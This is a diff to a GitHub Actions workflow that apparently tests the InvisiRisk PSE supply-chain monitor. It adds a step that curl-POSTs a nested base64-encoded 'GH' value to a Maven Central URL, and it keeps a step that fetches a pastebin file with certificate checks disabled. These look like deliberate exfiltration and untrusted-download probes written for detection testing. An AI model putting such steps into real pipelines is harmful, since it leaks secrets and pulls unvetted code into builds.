@@ -17,7 +17,7 @@ jobs:
         uses: actions/checkout@v4
         
       - name: Setup PSE
-        uses: invisirisk/pse-action@latest
+        uses: invisirisk/pse-action@dev-test
         with:
           api_url: "https://app.stage.invisirisk.com"
           app_token: ${{ secrets.IR_API_KEY_STAGE }}
@@ -95,6 +95,12 @@ jobs:
         run: |
           curl -k https://pastebin.com/raw/V4FrgKcm
 
+      - name: non web request body
+        run: |
+          curl -X POST https://repo1.maven.org/maven2/org/apache/commons/commons-lang3/3.12.0/commons-lang3-3.12.0.jar \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'
+
 
       - name: Install dependencies
         run: npm install --legacy-peer-deps --force
@@ -106,7 +112,7 @@ jobs:
 
       - name: Cleanup PSE
         if: always()
-        uses: invisirisk/pse-action@latest
+        uses: invisirisk/pse-action@dev-test
         with:
           cleanup: "true"
           
@@ -118,7 +124,7 @@ jobs:
    if: always()
    steps:
    - name: Gather Status
-     uses: invisirisk/pse-action@latest
+     uses: invisirisk/pse-action@dev-test
      with:
       api_url: "https://app.stage.invisirisk.com"
       app_token: ${{ secrets.IR_API_KEY_STAGE }}
